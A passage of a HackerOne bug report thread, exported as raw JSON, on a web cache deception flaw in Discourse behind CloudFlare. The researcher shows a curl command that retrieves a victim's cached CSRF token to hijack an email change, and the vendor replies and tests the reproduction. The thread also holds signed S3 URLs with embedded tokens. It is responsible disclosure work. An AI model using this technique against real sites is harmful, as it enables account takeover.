16b2226f68\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/video\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe reason why all this works to refresh everyones memory on this bug, is that any path under \u003ccode\u003e/u/*.css\u003c/code\u003e will respond when signed in with CSRF-tokens in the error page. Since there are no proper Cache-Control headers on this 404 page, CloudFlare will happily cache the file since it thinks it\u0026#39;s a CSS-file. If there would be a \u003ccode\u003eCache-Control: no-cache\u003c/code\u003e whenever CSRF-tokens are in the templates, this attack would not work.\u003c/p\u003e\n\n\u003cp\u003eAlso, to show you that it does in fact get cached on CloudFlare, here are the same URL tried in my region, and all of them are showing the user\u0026#39;s CSRF-token when the file was requested, which is the one I\u0026#39;m using to trigger the email-change:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2018-01-14_at_23.44.51.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/253/980/47ff68d15e126d4585771322bb6e2e3ca79d1961/Screen_Shot_2018-01-14_at_23.44.51.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-01-14_at_23.44.51.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-01-14_at_23.44.51.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4HB4ZZGG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T051452Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFBKbMTaGKwVCK0x7JNAOijlMVw%2BhW%2FIG%2FoSYnjiHiHKAiALX1HXrCEc%2FI%2FnVrq803X%2FALiQpBxAlCHE%2Bh8zwqcfmSq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM1pLsQIVwlUu9%2FWdzKpEDno5dfN3IVf%2B7OsdAYS9SWEsPaEcB2YetTOtoMoT8QkXafStRJxQSEckvansRxadLw3NEtOPJvUCKQ1FSfSh7PFvC6uVfFJETqBnLL3fMQIGcAQZlOES1A7KCuxJT2s%2FayJYm9KXYzydI49kvJbjn3MhPgu4OzSnr601lrMTBegiJpfNO%2B%2FeSktzRhCINpAxF%2F2a4j2lstKLfaje8wR6hRJqdSRWJF9M8hMiccij8fb6xzNCHJahS%2BfaEo7RLAy5%2FPpBxYVi3ogO%2Bi%2F4BRT3eb1Z9RpGG9qNkGuyY7ce3DvMgdTkSjHBcsYXBywd8fd%2BaBZwWJd5uw351hwVm22gEjaBsMXjDBuKYWVQcA%2BrEoUuOGGuH6bDr%2B2WdDMHHXX7MgZgH7ziMbq2HG%2FZKMv1Xym51QlR6qp3%2BP6Xz3oMScAiG6Dqm%2FjDmNx9bwBHdu7tvsWABnhe6esdM9Fno0WZ3lIkHOq4HRIf10Qe%2BDDAUhhVc45YNdWlThBy0I6Le7VinfP6o%2F%2BKPpdhWEDht%2BPKwSuwwvNGq%2FwU67AHczVFtKf2TPLO9ophgOhkJ%2BZe077T3hvPbRZ7D4GzMnizYODRG9nQWzx68CzHlMuom3RU16aBeESIBNhc9NjST%2Bt3Bw%2FkvdjiPIAwfnnl0ATW5KpAuIAujTjCnWWC5x9o79v0x9%2Bnkl%2BlSYo41rg7HDE%2BhHWG7fKOUzGpWpyUJFwUo4XO2BBz%2F9JPwjpoD5vZa6vKnLi1NmWkYRn1R6E4QMqIGHABVzTr2BlnRNMM7IY6DbFqrNpuXMJjVs26ZuTl70H1lwMzeG43ORGVGlYhsYokTZrRPzq8ZdhxoEwkFN0OgfU2QSH1HVj5iow%3D%3D\u0026amp;X-Amz-Signature=f31fe3ff4591c0b0a65f87da9e7cafbc89c02b6a5f14be4239605b886b7bb72b\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/253/980/47ff68d15e126d4585771322bb6e2e3ca79d1961/Screen_Shot_2018-01-14_at_23.44.51.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-01-14_at_23.44.51.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-01-14_at_23.44.51.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4HB4ZZGG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T051452Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFBKbMTaGKwVCK0x7JNAOijlMVw%2BhW%2FIG%2FoSYnjiHiHKAiALX1HXrCEc%2FI%2FnVrq803X%2FALiQpBxAlCHE%2Bh8zwqcfmSq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM1pLsQIVwlUu9%2FWdzKpEDno5dfN3IVf%2B7OsdAYS9SWEsPaEcB2YetTOtoMoT8QkXafStRJxQSEckvansRxadLw3NEtOPJvUCKQ1FSfSh7PFvC6uVfFJETqBnLL3fMQIGcAQZlOES1A7KCuxJT2s%2FayJYm9KXYzydI49kvJbjn3MhPgu4OzSnr601lrMTBegiJpfNO%2B%2FeSktzRhCINpAxF%2F2a4j2lstKLfaje8wR6hRJqdSRWJF9M8hMiccij8fb6xzNCHJahS%2BfaEo7RLAy5%2FPpBxYVi3ogO%2Bi%2F4BRT3eb1Z9RpGG9qNkGuyY7ce3DvMgdTkSjHBcsYXBywd8fd%2BaBZwWJd5uw351hwVm22gEjaBsMXjDBuKYWVQcA%2BrEoUuOGGuH6bDr%2B2WdDMHHXX7MgZgH7ziMbq2HG%2FZKMv1Xym51QlR6qp3%2BP6Xz3oMScAiG6Dqm%2FjDmNx9bwBHdu7tvsWABnhe6esdM9Fno0WZ3lIkHOq4HRIf10Qe%2BDDAUhhVc45YNdWlThBy0I6Le7VinfP6o%2F%2BKPpdhWEDht%2BPKwSuwwvNGq%2FwU67AHczVFtKf2TPLO9ophgOhkJ%2BZe077T3hvPbRZ7D4GzMnizYODRG9nQWzx68CzHlMuom3RU16aBeESIBNhc9NjST%2Bt3Bw%2FkvdjiPIAwfnnl0ATW5KpAuIAujTjCnWWC5x9o79v0x9%2Bnkl%2BlSYo41rg7HDE%2BhHWG7fKOUzGpWpyUJFwUo4XO2BBz%2F9JPwjpoD5vZa6vKnLi1NmWkYRn1R6E4QMqIGHABVzTr2BlnRNMM7IY6DbFqrNpuXMJjVs26ZuTl70H1lwMzeG43ORGVGlYhsYokTZrRPzq8ZdhxoEwkFN0OgfU2QSH1HVj5iow%3D%3D\u0026amp;X-Amz-Signature=f31fe3ff4591c0b0a65f87da9e7cafbc89c02b6a5f14be4239605b886b7bb72b\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2018-01-14_at_23.44.58.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/253/979/852c304f53383523085e98d88e73b8563c3239fe/Screen_Shot_2018-01-14_at_23.44.58.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-01-14_at_23.44.58.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-01-14_at_23.44.58.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4HB4ZZGG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T051452Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFBKbMTaGKwVCK0x7JNAOijlMVw%2BhW%2FIG%2FoSYnjiHiHKAiALX1HXrCEc%2FI%2FnVrq803X%2FALiQpBxAlCHE%2Bh8zwqcfmSq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM1pLsQIVwlUu9%2FWdzKpEDno5dfN3IVf%2B7OsdAYS9SWEsPaEcB2YetTOtoMoT8QkXafStRJxQSEckvansRxadLw3NEtOPJvUCKQ1FSfSh7PFvC6uVfFJETqBnLL3fMQIGcAQZlOES1A7KCuxJT2s%2FayJYm9KXYzydI49kvJbjn3MhPgu4OzSnr601lrMTBegiJpfNO%2B%2FeSktzRhCINpAxF%2F2a4j2lstKLfaje8wR6hRJqdSRWJF9M8hMiccij8fb6xzNCHJahS%2BfaEo7RLAy5%2FPpBxYVi3ogO%2Bi%2F4BRT3eb1Z9RpGG9qNkGuyY7ce3DvMgdTkSjHBcsYXBywd8fd%2BaBZwWJd5uw351hwVm22gEjaBsMXjDBuKYWVQcA%2BrEoUuOGGuH6bDr%2B2WdDMHHXX7MgZgH7ziMbq2HG%2FZKMv1Xym51QlR6qp3%2BP6Xz3oMScAiG6Dqm%2FjDmNx9bwBHdu7tvsWABnhe6esdM9Fno0WZ3lIkHOq4HRIf10Qe%2BDDAUhhVc45YNdWlThBy0I6Le7VinfP6o%2F%2BKPpdhWEDht%2BPKwSuwwvNGq%2FwU67AHczVFtKf2TPLO9ophgOhkJ%2BZe077T3hvPbRZ7D4GzMnizYODRG9nQWzx68CzHlMuom3RU16aBeESIBNhc9NjST%2Bt3Bw%2FkvdjiPIAwfnnl0ATW5KpAuIAujTjCnWWC5x9o79v0x9%2Bnkl%2BlSYo41rg7HDE%2BhHWG7fKOUzGpWpyUJFwUo4XO2BBz%2F9JPwjpoD5vZa6vKnLi1NmWkYRn1R6E4QMqIGHABVzTr2BlnRNMM7IY6DbFqrNpuXMJjVs26ZuTl70H1lwMzeG43ORGVGlYhsYokTZrRPzq8ZdhxoEwkFN0OgfU2QSH1HVj5iow%3D%3D\u0026amp;X-Amz-Signature=2bc902f7e1db49464d15e715905cc96001bafde47535a51677fb69266b00ea54\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/253/979/852c304f53383523085e98d88e73b8563c3239fe/Screen_Shot_2018-01-14_at_23.44.58.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-01-14_at_23.44.58.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-01-14_at_23.44.58.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4HB4ZZGG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T051452Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFBKbMTaGKwVCK0x7JNAOijlMVw%2BhW%2FIG%2FoSYnjiHiHKAiALX1HXrCEc%2FI%2FnVrq803X%2FALiQpBxAlCHE%2Bh8zwqcfmSq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM1pLsQIVwlUu9%2FWdzKpEDno5dfN3IVf%2B7OsdAYS9SWEsPaEcB2YetTOtoMoT8QkXafStRJxQSEckvansRxadLw3NEtOPJvUCKQ1FSfSh7PFvC6uVfFJETqBnLL3fMQIGcAQZlOES1A7KCuxJT2s%2FayJYm9KXYzydI49kvJbjn3MhPgu4OzSnr601lrMTBegiJpfNO%2B%2FeSktzRhCINpAxF%2F2a4j2lstKLfaje8wR6hRJqdSRWJF9M8hMiccij8fb6xzNCHJahS%2BfaEo7RLAy5%2FPpBxYVi3ogO%2Bi%2F4BRT3eb1Z9RpGG9qNkGuyY7ce3DvMgdTkSjHBcsYXBywd8fd%2BaBZwWJd5uw351hwVm22gEjaBsMXjDBuKYWVQcA%2BrEoUuOGGuH6bDr%2B2WdDMHHXX7MgZgH7ziMbq2HG%2FZKMv1Xym51QlR6qp3%2BP6Xz3oMScAiG6Dqm%2FjDmNx9bwBHdu7tvsWABnhe6esdM9Fno0WZ3lIkHOq4HRIf10Qe%2BDDAUhhVc45YNdWlThBy0I6Le7VinfP6o%2F%2BKPpdhWEDht%2BPKwSuwwvNGq%2FwU67AHczVFtKf2TPLO9ophgOhkJ%2BZe077T3hvPbRZ7D4GzMnizYODRG9nQWzx68CzHlMuom3RU16aBeESIBNhc9NjST%2Bt3Bw%2FkvdjiPIAwfnnl0ATW5KpAuIAujTjCnWWC5x9o79v0x9%2Bnkl%2BlSYo41rg7HDE%2BhHWG7fKOUzGpWpyUJFwUo4XO2BBz%2F9JPwjpoD5vZa6vKnLi1NmWkYRn1R6E4QMqIGHABVzTr2BlnRNMM7IY6DbFqrNpuXMJjVs26ZuTl70H1lwMzeG43ORGVGlYhsYokTZrRPzq8ZdhxoEwkFN0OgfU2QSH1HVj5iow%3D%3D\u0026amp;X-Amz-Signature=2bc902f7e1db49464d15e715905cc96001bafde47535a51677fb69266b00ea54\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003elocal @ cache $ curl -s https://discourse.algolia.com/u/469843.css | grep csrf-token\n\u0026lt;meta name=\u0026quot;csrf-token\u0026quot; content=\u0026quot;CaTKE2wq4jczCZO+LTasy6SvBBHxaYJr9giqym1PSaCtgz5IgofUOmrufGYdrnTgS8ZHM67/SPgUAroHv1zMFw==\u0026quot; /\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe only setup Algolia made here was to put the Discourse-application behind CloudFlare. This is a regular setup if you\u0026#39;re using CloudFlare\u0026#39;s proxy to speed up the website and to hide the origin and sometimes make sure you\u0026#39;re protected against DDoS.\u003c/p\u003e\n\n\u003cp\u003eHope this helps, and sorry for my late reply.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nFrans\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-14T22:47:57.598Z","updated_at":"2018-01-14T22:49:50.860Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":253981,"filename":"AlgoliaTakeover.mp4","type":"video/mp4","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/253/981/8531fd700671a5b86646925d06969b7af7670bf0/AlgoliaTakeover.mp4?response-content-disposition=attachment%3B%20filename%3D%22AlgoliaTakeover.mp4%22%3B%20filename%2A%3DUTF-8%27%27AlgoliaTakeover.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4HB4ZZGG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T051452Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFBKbMTaGKwVCK0x7JNAOijlMVw%2BhW%2FIG%2FoSYnjiHiHKAiALX1HXrCEc%2FI%2FnVrq803X%2FALiQpBxAlCHE%2Bh8zwqcfmSq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM1pLsQIVwlUu9%2FWdzKpEDno5dfN3IVf%2B7OsdAYS9SWEsPaEcB2YetTOtoMoT8QkXafStRJxQSEckvansRxadLw3NEtOPJvUCKQ1FSfSh7PFvC6uVfFJETqBnLL3fMQIGcAQZlOES1A7KCuxJT2s%2FayJYm9KXYzydI49kvJbjn3MhPgu4OzSnr601lrMTBegiJpfNO%2B%2FeSktzRhCINpAxF%2F2a4j2lstKLfaje8wR6hRJqdSRWJF9M8hMiccij8fb6xzNCHJahS%2BfaEo7RLAy5%2FPpBxYVi3ogO%2Bi%2F4BRT3eb1Z9RpGG9qNkGuyY7ce3DvMgdTkSjHBcsYXBywd8fd%2BaBZwWJd5uw351hwVm22gEjaBsMXjDBuKYWVQcA%2BrEoUuOGGuH6bDr%2B2WdDMHHXX7MgZgH7ziMbq2HG%2FZKMv1Xym51QlR6qp3%2BP6Xz3oMScAiG6Dqm%2FjDmNx9bwBHdu7tvsWABnhe6esdM9Fno0WZ3lIkHOq4HRIf10Qe%2BDDAUhhVc45YNdWlThBy0I6Le7VinfP6o%2F%2BKPpdhWEDht%2BPKwSuwwvNGq%2FwU67AHczVFtKf2TPLO9ophgOhkJ%2BZe077T3hvPbRZ7D4GzMnizYODRG9nQWzx68CzHlMuom3RU16aBeESIBNhc9NjST%2Bt3Bw%2FkvdjiPIAwfnnl0ATW5KpAuIAujTjCnWWC5x9o79v0x9%2Bnkl%2BlSYo41rg7HDE%2BhHWG7fKOUzGpWpyUJFwUo4XO2BBz%2F9JPwjpoD5vZa6vKnLi1NmWkYRn1R6E4QMqIGHABVzTr2BlnRNMM7IY6DbFqrNpuXMJjVs26ZuTl70H1lwMzeG43ORGVGlYhsYokTZrRPzq8ZdhxoEwkFN0OgfU2QSH1HVj5iow%3D%3D\u0026X-Amz-Signature=e0a50d36ac6919c05c3c46ea32a7c15ad90d2f5eaae3771da1215e16b2226f68"},{"id":253980,"filename":"Screen_Shot_2018-01-14_at_23.44.51.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/253/980/47ff68d15e126d4585771322bb6e2e3ca79d1961/Screen_Shot_2018-01-14_at_23.44.51.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-01-14_at_23.44.51.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-01-14_at_23.44.51.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4HB4ZZGG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T051452Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFBKbMTaGKwVCK0x7JNAOijlMVw%2BhW%2FIG%2FoSYnjiHiHKAiALX1HXrCEc%2FI%2FnVrq803X%2FALiQpBxAlCHE%2Bh8zwqcfmSq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM1pLsQIVwlUu9%2FWdzKpEDno5dfN3IVf%2B7OsdAYS9SWEsPaEcB2YetTOtoMoT8QkXafStRJxQSEckvansRxadLw3NEtOPJvUCKQ1FSfSh7PFvC6uVfFJETqBnLL3fMQIGcAQZlOES1A7KCuxJT2s%2FayJYm9KXYzydI49kvJbjn3MhPgu4OzSnr601lrMTBegiJpfNO%2B%2FeSktzRhCINpAxF%2F2a4j2lstKLfaje8wR6hRJqdSRWJF9M8hMiccij8fb6xzNCHJahS%2BfaEo7RLAy5%2FPpBxYVi3ogO%2Bi%2F4BRT3eb1Z9RpGG9qNkGuyY7ce3DvMgdTkSjHBcsYXBywd8fd%2BaBZwWJd5uw351hwVm22gEjaBsMXjDBuKYWVQcA%2BrEoUuOGGuH6bDr%2B2WdDMHHXX7MgZgH7ziMbq2HG%2FZKMv1Xym51QlR6qp3%2BP6Xz3oMScAiG6Dqm%2FjDmNx9bwBHdu7tvsWABnhe6esdM9Fno0WZ3lIkHOq4HRIf10Qe%2BDDAUhhVc45YNdWlThBy0I6Le7VinfP6o%2F%2BKPpdhWEDht%2BPKwSuwwvNGq%2FwU67AHczVFtKf2TPLO9ophgOhkJ%2BZe077T3hvPbRZ7D4GzMnizYODRG9nQWzx68CzHlMuom3RU16aBeESIBNhc9NjST%2Bt3Bw%2FkvdjiPIAwfnnl0ATW5KpAuIAujTjCnWWC5x9o79v0x9%2Bnkl%2BlSYo41rg7HDE%2BhHWG7fKOUzGpWpyUJFwUo4XO2BBz%2F9JPwjpoD5vZa6vKnLi1NmWkYRn1R6E4QMqIGHABVzTr2BlnRNMM7IY6DbFqrNpuXMJjVs26ZuTl70H1lwMzeG43ORGVGlYhsYokTZrRPzq8ZdhxoEwkFN0OgfU2QSH1HVj5iow%3D%3D\u0026X-Amz-Signature=f31fe3ff4591c0b0a65f87da9e7cafbc89c02b6a5f14be4239605b886b7bb72b"},{"id":253979,"filename":"Screen_Shot_2018-01-14_at_23.44.58.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/253/979/852c304f53383523085e98d88e73b8563c3239fe/Screen_Shot_2018-01-14_at_23.44.58.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-01-14_at_23.44.58.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-01-14_at_23.44.58.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4HB4ZZGG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T051452Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFBKbMTaGKwVCK0x7JNAOijlMVw%2BhW%2FIG%2FoSYnjiHiHKAiALX1HXrCEc%2FI%2FnVrq803X%2FALiQpBxAlCHE%2Bh8zwqcfmSq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM1pLsQIVwlUu9%2FWdzKpEDno5dfN3IVf%2B7OsdAYS9SWEsPaEcB2YetTOtoMoT8QkXafStRJxQSEckvansRxadLw3NEtOPJvUCKQ1FSfSh7PFvC6uVfFJETqBnLL3fMQIGcAQZlOES1A7KCuxJT2s%2FayJYm9KXYzydI49kvJbjn3MhPgu4OzSnr601lrMTBegiJpfNO%2B%2FeSktzRhCINpAxF%2F2a4j2lstKLfaje8wR6hRJqdSRWJF9M8hMiccij8fb6xzNCHJahS%2BfaEo7RLAy5%2FPpBxYVi3ogO%2Bi%2F4BRT3eb1Z9RpGG9qNkGuyY7ce3DvMgdTkSjHBcsYXBywd8fd%2BaBZwWJd5uw351hwVm22gEjaBsMXjDBuKYWVQcA%2BrEoUuOGGuH6bDr%2B2WdDMHHXX7MgZgH7ziMbq2HG%2FZKMv1Xym51QlR6qp3%2BP6Xz3oMScAiG6Dqm%2FjDmNx9bwBHdu7tvsWABnhe6esdM9Fno0WZ3lIkHOq4HRIf10Qe%2BDDAUhhVc45YNdWlThBy0I6Le7VinfP6o%2F%2BKPpdhWEDht%2BPKwSuwwvNGq%2FwU67AHczVFtKf2TPLO9ophgOhkJ%2BZe077T3hvPbRZ7D4GzMnizYODRG9nQWzx68CzHlMuom3RU16aBeESIBNhc9NjST%2Bt3Bw%2FkvdjiPIAwfnnl0ATW5KpAuIAujTjCnWWC5x9o79v0x9%2Bnkl%2BlSYo41rg7HDE%2BhHWG7fKOUzGpWpyUJFwUo4XO2BBz%2F9JPwjpoD5vZa6vKnLi1NmWkYRn1R6E4QMqIGHABVzTr2BlnRNMM7IY6DbFqrNpuXMJjVs26ZuTl70H1lwMzeG43ORGVGlYhsYokTZrRPzq8ZdhxoEwkFN0OgfU2QSH1HVj5iow%3D%3D\u0026X-Amz-Signature=2bc902f7e1db49464d15e715905cc96001bafde47535a51677fb69266b00ea54"}],"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2304532,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great find @fransrosen! We've escalated this to the development team to see if this is something they would like to fix, and will get back to you as soon as we have any updates.\n\nKind regards,\n@asuka ","markdown_message":"\u003cp\u003eGreat find \u003ca href=\"/fransrosen\"\u003e@fransrosen\u003c/a\u003e! We\u0026#39;ve escalated this to the development team to see if this is something they would like to fix, and will get back to you as soon as we have any updates.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/asuka\"\u003e@asuka\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-21T09:37:15.700Z","updated_at":"2018-01-21T09:37:15.700Z","actor":{"username":"asuka","cleared":false,"url":"/asuka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/111/923/28e02b13f94679bbda8c7d3b7390776d8977f1b6_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2340463,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We view this as low priority but we do eventually want to make it so bad .css requests don't return 200.\n\n\u003e The reason why all this works to refresh everyones memory on this bug, is that any path under `/u/*.css` will respond when signed in with CSRF-tokens in the error page","markdown_message":"\u003cp\u003eWe view this as low priority but we do eventually want to make it so bad .css requests don\u0026#39;t return 200.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eThe reason why all this works to refresh everyones memory on this bug, is that any path under \u003ccode\u003e/u/*.css\u003c/code\u003e will respond when signed in with CSRF-tokens in the error page\u003c/p\u003e\n\u003c/blockquote\u003e\n","automated_response":false,"created_at":"2018-01-31T22:24:55.285Z","updated_at":"2018-01-31T22:27:01.875Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2340464,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-01-31T22:25:09.199Z","updated_at":"2018-01-31T22:25:09.199Z","additional_data":{"old_severity":null,"new_severity":"Low","old_severity_id":null,"new_severity_id":114176},"actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2340637,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"We are not sure we can repro this? We are hitting `try.discourse.org/u/samsaffron/activity.css` and getting a response code of 406?\n\n```\njeff@WUMPUS:~$ curl -I https://try.discourse.org/u/samsaffron/activity.css\nHTTP/1.1 406 Not Acceptable\nServer: nginx/1.13.6\nDate: Wed, 31 Jan 2018 23:24:57 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 0\nConnection: keep-alive\nX-Request-Id: c2757c97-24a1-484c-97a3-56d203acf8a5\nX-Runtime: 0.024248\nDiscourse-Proxy-ID: app-router-tiehunter01\nStrict-Transport-Security: max-age=31415926\n```\n\nIs the report specific to the redirect routes `/users` and `/my` then?","markdown_message":"\u003cp\u003eWe are not sure we can repro this? We are hitting \u003ccode\u003etry.discourse.org/u/samsaffron/activity.css\u003c/code\u003e and getting a response code of 406?\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ejeff@WUMPUS:~$ curl -I https://try.discourse.org/u/samsaffron/activity.css\nHTTP/1.1 406 Not Acceptable\nServer: nginx/1.13.6\nDate: Wed, 31 Jan 2018 23:24:57 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 0\nConnection: keep-alive\nX-Request-Id: c2757c97-24a1-484c-97a3-56d203acf8a5\nX-Runtime: 0.024248\nDiscourse-Proxy-ID: app-router-tiehunter01\nStrict-Transport-Security: max-age=31415926\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIs the report specific to the redirect routes \u003ccode\u003e/users\u003c/code\u003e and \u003ccode\u003e/my\u003c/code\u003e 